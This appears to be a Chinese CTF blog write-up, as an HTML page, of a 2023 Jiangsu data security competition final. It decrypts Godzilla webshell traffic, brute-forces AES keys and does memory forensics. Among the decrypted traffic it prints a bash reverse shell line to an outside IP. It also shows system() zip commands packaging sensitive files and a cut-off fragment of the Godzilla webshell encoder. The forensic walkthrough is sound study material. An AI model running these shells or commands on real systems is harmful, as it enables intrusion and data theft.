@@ -1,0 +1,344 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2023 江苏省数据安全竞赛 决赛 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="哥斯拉 webshell 流量解密 + AES md5 爆破 5 位 hex key + 内存取证 + 框架版本还原。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 江苏省数据安全竞赛 决赛">
+<meta property="og:url" content="https://pudong617.github.io/2023/01/01/ctf-kb/wp/%E5%8F%96%E8%AF%81/2023_%E6%B1%9F%E8%8B%8F%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B_%E5%86%B3%E8%B5%9B/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="哥斯拉 webshell 流量解密 + AES md5 爆破 5 位 hex key + 内存取证 + 框架版本还原。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="哥斯拉webshell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2023/01/01/ctf-kb/wp/%E5%8F%96%E8%AF%81/2023_%E6%B1%9F%E8%8B%8F%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B_%E5%86%B3%E8%B5%9B/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2023 江苏省数据安全竞赛 决赛',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2023 江苏省数据安全竞赛 决赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-31T16:00:00.000Z" title="发表于 2023-01-01 00:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-31T16:00:00.000Z" title="更新于 2023-01-01 00:00:00">2023-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%96%E8%AF%81/">取证</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2023 江苏省数据安全竞赛 决赛"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/142203.html">https://www.ctfiot.com/142203.html</a><br>ID: 142203</p>
+</blockquote>
+<p>一个多月前的比赛了，直到最近偶然得知出题人竟在我“身边”，要来wp，才把比赛中没解出来的题目补全。（倒也没补得很全，还有一题逆向，不过那属于知识盲区了，逆向的区域，以后再来探索叭。）</p>
+<p>crypto-easy_rsa<br>基础 rsa，e 和 phi 公因子5，所以除5，算d，解密，开根</p>
+<p>这题值得另起一篇文章分析。</p>
+<p>黑客使用哥斯拉成功连接受害服务器并返回数据的时间是_____________。（格式为YYYY-MM-DD_HH:MM:SS）</p>
+<p>回到问题，数据返回的时间是</p>
+<p>受害服务器的上游服务器IPv6地址是_________________。</p>
+<p>解密第 67 流最下面的密文数据，</p>
+<p>import gzip<br>def dec(c,key):<br> p&#x3D;””<br> for i in range(len(c)):<br>  p +&#x3D; chr(ord(c[i])^ord(key[(i+1)&amp;15]))<br> return p</p>
+<p>cipher &#x3D; b”fO1rZmU5Yjk5YEtsqkLCDne7iE3No89VJx0yixLpBdTJXjOGqU2tfxwj7qInvyAUEtT7CfoSDh7QJvm6I8f9zfNoJAIDHjncHL0Vr6LpypsL2oZS&#x2F;z&#x2F;xYA1aBPEbbhqJrsQcRaXfsUnLPzvqb27Y+d7aK7UYR0Li1izdxQ&#x2F;TvMG&#x2F;PWwhSrXfCXGFdyqvjIb1pe3fFdkdqQDjb0v3xU1XmuTvzMnKkSrO4EIT04yGYZIOpCZUytFAYOnLfPpBuPIey&#x2F;ULs9NwqS9Oaju72mswqHZhS&#x2F;yobzO1J22xpB0Tlm+Sgdm+w2LVw3ykQCnm+VNqssJp8dadPH9O9MT1gh4cDPM7bePNdekG64HJTtc8y2Ox0LMEdPxOMN7I0G5kSsVmBpMRfCn6C5T97o9VWzp2RbcWIM3rqBSpjIZ8IlYIsnrx7HmwFZ5wi2XTQR14nJJU4P7PM4Y7pvevKjVdhaKItcNYK52nQz2mjXyxRqabEM&#x2F;yDB&#x2F;PQzTJv9onHAEYhwckZjd7yucx+w5a+ubvB2YJKRI&#x2F;FCWmscTPPYMCebpckooUTHY&#x2F;E4FvvJ40&#x2F;MKCmR2dHls3e8ponKmqEavX&#x2F;bA7ermcqyFpvUpO4HD2Cckjv7uDaPnw3ob+VwipTW1SU7dLjoD9p14XRxJWJXMN9Cu7Q9zZENsAbif7lgscBzEz&#x2F;Kov9Ok3oL7edfIRgcVBPBzPW4WshuzzxCLkucS2+H9z2GaLm52yNXIjNCMmFlhBiOEaNWQoZH3gMOzcp7ZqXrz4wR7sYLgQuCl4rFW14K4hG+Fbsay9KJ27gPOrYVwI2iYEa0PkdN8wNs9lGzu1gPc4&#x2F;kMls1rh52m63kbajPh6geBGa0e1WnK+yrrU3rIC2gmjKynJ+QUQQM+gH8RkcoUAr3yRD09xupGngrBi5&#x2F;ESUbIHZlBTn6GDP6HK6xD7B85+Lj+zZ52kjESwOu8i74Bwamrk0cn+z+zBu9Yb0iab1XBTRKoOHD0JrtX1R3oV0J7vi9pahwsd&#x2F;e5MNEt9X01KbbxUPtn4LuDZH61ZvBhT8ICM0XH5pgq2eAFI&#x2F;mRbWgA9pih&#x2F;ot9Grf9GIYIC75cGJzfuSScjGg5Fcy6WqrsANDiT4C+de19P&#x2F;uWRX0H&#x2F;eYuVuv5vCQYYJrpOpwHI7nORbdeXjhsrn&#x2F;kpVuy9L&#x2F;n3QOVHID0j&#x2F;af4LofMy71Ov8M8O9gdlWhjvfIgyTmAE3+PgmNjZg&#x3D;&#x3D;”<br>from base64 import *</p>
+<p>gg &#x3D; dec(b64decode(cipher).decode(“latin1”),”6cfcfe9b99c68a0a”)<br>print(gzip.decompress(gg.encode(“latin1”)).decode())</p>
+<p>得到</p>
+<p>OsInfo : Linux ctmd 6.2.0-32-generic #32~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 18 10:40:13 UTC 2 x86_64<br>CurrentUser : www<br>REMOTE_ADDR : fd15:<br>4ba5:<br>5a2b:<br>1008:<br>20c:<br>29ff:<br>fe57:<br>a107<br>REMOTE_PORT : 33928<br>HTTP_X_FORWARDED_FOR : fd15:<br>4ba5:<br>5a2b:<br>1008:<br>f581:<br>619a:<br>b163:<br>c627<br>HTTP_CLIENT_IP : <br>SERVER_ADDR : fd15:<br>4ba5:<br>5a2b:<br>1008:<br>60b9:<br>ff63:<br>528e:<br>149d<br>SERVER_NAME : tp6.0.1.com<br>SERVER_PORT : 32154<br>disable_functions : <br>Open_basedir : <br>timezone : PRC<br>encode : <br>extension_dir : &#x2F;www&#x2F;server&#x2F;php&#x2F;81&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20210902<br>systempdir : &#x2F;tmp&#x2F;<br>include_path : .:<br>DOCUMENT_ROOT : &#x2F;www&#x2F;wwwroot&#x2F;32154&#x2F;tp&#x2F;public<br>PHP_SAPI : fpm-fcgi<br>PHP_VERSION : 8.1.17<br>PHP_INT_SIZE : 8<br>ProcessArch : x64<br>PHP_OS : Linux<br>canCallGzipDecode : 1<br>canCallGzipEncode : 1<br>session_name : PHPSESSID<br>session_save_path : <br>session_save_handler : files<br>session_serialize_handler : php<br>user_ini_filename : .user.ini<br>memory_limit : 128M<br>upload_max_filesize : 50M<br>post_max_size : 50M<br>max_execution_time : 0<br>max_input_time : 60<br>default_socket_timeout : 60<br>mygid : 1001<br>mypid : 81435<br>SERVER_SOFTWAREypid : nginx&#x2F;1.22.1<br>loaded_extensions : Core,date,libxml,openssl,pcre,sqlite3,zlib,bcmath,ctype,curl,dom,filter,ftp,gd,gettext,hash,iconv,intl,json,mbstring,SPL,session,pcntl,standard,mysqlnd,PDO,pdo_mysql,pdo_sqlite,Phar,posix,Reflection,mysqli,shmop,SimpleXML,soap,sockets,sodium,sysvsem,tokenizer,xml,xmlreader,xmlwriter,cgi-fcgi,zip<br>short_open_tag : true<br>asp_tags : false<br>safe_mode : false<br>CurrentDir : &#x2F;www&#x2F;wwwroot&#x2F;32154&#x2F;tp&#x2F;public<br>FileRoot : &#x2F;</p>
+<p>三个 ipv6 都试了一下，好像是：fd15:<br>4ba5:<br>5a2b:<br>1008:<br>60b9:<br>ff63:<br>528e:<br>149d</p>
+<p>黑客对受害服务器上的敏感文件进行打包操作，请问该压缩包密码是___________。</p>
+<p>接下来是非常脑洞的部分：</p>
+<p>在 57 流能够看到一段base64</p>
+<p>解密后是一段php 的 aes 加密</p>
+<?php    
+function customEncrypt($data, $key) {
+    $key = md5($key);
+    $iv = random_bytes(16);
+    $encryptedData = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
+    $result = base64_encode($iv . $encryptedData);
+    return $result;
+}
+
+但是我们没key啊？预期解是让我们爆，，key 的长度是 5 个字符，并且是十六进制字符，很难崩，爆出来的密钥是 61c42
+
+找到第23流的数据
+
+from base64 import *
+
+cc = b64decode("jiVOhckW3Dp9ePlm2iuyBWBHWNlDxWbTlAqPt+JLIa8s3+vJZlcVIHKETqbIknErPCkevvm3heHFI5Vc5W8Wby8+W+6hfhjM/i0XyxsbIZVj5QyHQ4isWlekCszQlevGH8SlxjvfIRcbMxdUXREI/EWGiZKdFL81U80x7V9em+MJ4KsScq0bgnJ98yq1nMcl")
+
+c = cc[16:]
+iv = cc[:16]
+key = b'a5a74e2ab431761ecb2299ef88d46a38'
+from Crypto.Cipher import AES
+enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)
+print(enc.decrypt(c))
+
+得到
+
+b’system(‘zip -q -r -P “SN@jSoiueFIEZSIDJ” /www/wwwroot/32154/tp/public/flag.zip /www/wwwroot/32154/tp/public/db/dumpfile.sql’);x02x02′
+
+黑客留下的后门IP地址和端口号是________________。（格式为IP_PORT）
+
+解密tcp 76流的流量，
+
+import gzip
+def dec(c,key):
+ p=""
+ for i in range(len(c)):
+  p += chr(ord(c[i])^ord(key[(i+1)&15]))
+ return p
+
+cipher = b"fO1rZmU5Yjk5YGVutX+r+rApKUqr2WAoM9n/MouZdJ+qbHM4w7v4pEcpXKEfeRO33cfC7/uQ/Jin8peZ37nwh/LH4ev/mFg5tEnbaCIwYTY="
+from base64 import *
+
+gg = dec(b64decode(cipher).decode("latin1"),"6cfcfe9b99c68a0a")
+print(gzip.decompress(gg.encode("latin1")).decode())
+
+得到
+
+#!/bin/bash
+bash -c 'exec bash -i &>/dev/tcp/114.5.1.211/42321 <&1'
+
+受害服务器上的中间件、中间件版本、PHP版本、框架名以及对应版本为___________。（格式为：中间件:
+中间件版本_PHP版本_框架名:
+框架版本，如tomcat:9.0.0_5.4.0_yii:2.38.0）
+
+根据第二题的信息，我们知道中间件的版本是 nginx/1.22.1；php的版本是 8.1.17，但是不知道 thinkphp 的版本
+
+和第三小题一样，不过密钥又换了 ，这回是 ‘23b4d’
+
+from base64 import *
+from hashlib import md5
+cc = b64decode("4Q77JutsR+DCTQEDptU6aUvtVVu5h+F+mIHcSE3jJl9hnjPSnBapKdxNNJ3i0Qgr")
+
+from Crypto.Cipher import AES
+c = cc[16:]
+iv = cc[:16]
+for i in range(1048575):
+ key = md5(hex(i)[2:].rjust(5,'0').encode()).hexdigest().encode()
+#key = b'a5a74e2ab431761ecb2299ef88d46a38'
+#key = b'1d77b220bdf94d38007e3e6e9c380588'
+ enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)
+ res = enc.decrypt(c)
+ if res[-1]==res[-2]==res[-3]:
+  print(res,hex(i))
+
+找到 version.zip 的密码
+
+from base64 import *
+from hashlib import md5
+cc = b64decode("WsclGnueTdLgsUSeNeoqvUouMsABv70pjjt+0cUFsLQMlEkgUVXIZV4cyshI0Z5aGXQ4ZNefWX37rbR88Im2Qp5j08fnwXj9st8vV2cdhfODV24X0iL5V5aR0pB+eRiNE+oDRLAQBxR2UBcnjCk/inupvIHpSzD9Ug1GhtFGdMW/SeF0+s6LCaeRSqvoggeF")
+
+from Crypto.Cipher import AES
+c = cc[16:]
+iv = cc[:16]
+key = b'1d77b220bdf94d38007e3e6e9c380588'
+enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)
+res = enc.decrypt(c)
+print(res)
+
+# b'system("zip -q -r -P "MS1209D@IOEJabnsdIUJEOI@" /www/wwwroot/32154/tp/public/version.zip /www/wwwroot/32154/tp/composer.json");x01'
+
+8604数据包拿到 version.zip
+
+获得框架版本
+
+所以 flag：nginx:1.22.1_8.1.17_thinkphp:6.0.12
+
+（比赛的时候根本没人能想到这么脑洞的加密方式，因此与压缩包密码相关的两题也都没人能做出来）
+
+请给出内存镜像中黑客使用工具对外连接的IP地址及端口号是___________。（格式为IP_PORT）
+
+volatility_2.6_win64_standalone.exe -f MemoryLife.raw --profile=Win7SP1x64 netscan
+
+找到一个nc.exe 外连192.168.233.1_54266
+
+请给出内存镜像中用户BGS-Chenyi的开机密码___________。
+
+使用工具 Passware Kit Forensic
+
+abc123456
+
+黑客工具里的LOGONSERVER环境变量值是___________。
+
+把 nc.exe dump下来，搜索LOGONSERVER，找到 BGS-CHENYJ-PC
+
+volatility_2.6_win64_standalone.exe -f MemoryLife.raw --profile=Win7SP1x64 pslist
+
+volatility_2.6_win64_standalone.exe -f MemoryLife.raw --profile=Win7SP1x64 memdump -p 3036 -D ./
+
+请给出内存镜像中屏幕里的内容___________。
+
+请给出wps.ini最后的修改时间_____________。（格式为YYYY-MM-DD_hh:mm:
+ss_+0000）
+
+附件链接：https://pan.baidu.com/s/1_TZbTEMiyiBKX_STc-81gQ?pwd=0t61
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line"></span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">d = inverse(e/5,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">m = iroot(m,5)[0]</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">c = &#x27;151911020907180A060E1D0506105F5F4B465F000248115C525D1B0756000E570c0457025c1c15535913&#x27;</span><br><span class="line">m = &#x27;737570657263616C6966726167696C697374696365787069616C69646F63696F757363616E647963616E&#x27;</span><br><span class="line"></span><br><span class="line">from pwn import xor</span><br><span class="line"></span><br><span class="line">print(xor(bytes.fromhex(m),bytes.fromhex(c)))</span><br><span class="line"></span><br><span class="line">b&#x27;flag&#123;dyfohoday36826cg0a531rc9cg8yw4c2xl08&#125;&#x27;</span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@error_reporting(0);</span><br><span class="line">function encode($D,$K)&#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class="line">        $c = $K[$i+1&amp;15];</span><br><span class="line">        $D[$i] = $D[$i]^$c;</span><br><span class="line">    &#125;</span><br><span 